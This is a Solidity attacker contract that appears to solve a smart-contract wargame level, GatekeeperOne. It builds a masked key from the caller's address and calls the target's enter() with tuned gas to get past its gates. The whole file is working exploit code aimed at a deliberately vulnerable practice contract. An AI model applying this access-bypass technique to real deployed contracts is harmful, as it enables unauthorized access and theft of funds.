// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./13-GatekeeperOne.sol";

contract GatekeeperOneAttacker {
    GatekeeperOne public gatekeeperOne;

    constructor(address _gatekeeperOneAddress) public {
        gatekeeperOne = GatekeeperOne(_gatekeeperOneAddress);
    }

    function attack(uint256 gasToUse) external payable {
        bytes8 key = bytes8(uint64(msg.sender) & 0xFFFFFFFF0000FFFF);
        bool confirm = gatekeeperOne.enter{gas: gasToUse}(key);
        require(confirm);
    }
}
